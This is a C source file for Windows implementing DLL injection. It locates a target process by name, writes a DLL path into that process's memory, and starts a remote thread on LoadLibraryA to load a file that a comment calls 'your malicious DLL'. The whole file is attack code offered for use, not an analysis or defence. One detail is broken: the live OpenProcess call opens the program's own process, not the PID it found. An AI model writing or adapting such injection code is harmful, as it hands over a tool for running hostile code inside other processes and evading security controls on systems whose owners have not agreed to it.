#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Function to retrieve the process ID (PID) of the target process by name
DWORD GetTargetProcessID(const char *processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create snapshot of processes. Error: %lu\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("Failed to get the first process entry. Error: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// Function to inject the DLL into the target process
BOOL InjectDLL(HANDLE hProcess, const char *dllPath) {
    SIZE_T len = strlen(dllPath) + 1;
    LPVOID pRemoteString = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteString == NULL) {
        printf("Failed to allocate memory in target process. Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteString, dllPath, len, NULL)) {
        printf("Failed to write DLL path into target process. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("Failed to get handle to kernel32.dll. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        printf("Failed to get address of LoadLibraryA. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteString, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    // Wait for the remote thread to complete the DLL injection
    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return TRUE;
}

int main() {
    const char *targetProcess = "cmd.exe"; // Replace with your target process name
    const char *dllPath = ".\\mal_dll.dll";    // Path to your malicious DLL

    // Get the process ID (PID) of the target process
    DWORD processID = GetTargetProcessID(targetProcess);
    if (processID == 0) {
        printf("Failed to find target process: %s\n", targetProcess);
        return 1;
    }

    // Open the target process with necessary permissions
    //HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    //HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
    if (hProcess == NULL) {
        printf("Failed to open target process. Error: %lu\n", GetLastError());
        return 1;
    }

    // Inject the DLL into the target process
    if (InjectDLL(hProcess, dllPath)) {
        printf("DLL injection succeeded.\n");
    } else {
        printf("DLL injection failed.\n");
    }

    CloseHandle(hProcess);
    return 0;
}
